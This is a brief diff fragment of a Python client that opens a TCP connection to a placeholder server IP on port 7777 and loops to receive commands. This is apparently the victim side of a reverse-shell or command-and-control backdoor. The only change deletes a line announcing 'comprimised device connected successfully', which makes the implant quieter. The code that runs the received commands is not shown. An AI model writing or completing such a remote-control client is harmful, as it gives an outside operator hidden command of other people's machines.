@@ -8,7 +8,6 @@ server_ip="ip"
 server_port=7777
 client_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect((server_ip,server_port))
-print("comprimised device connected successfully")
 while True:
     try:
         commands=client_socket.recv(1024).decode()
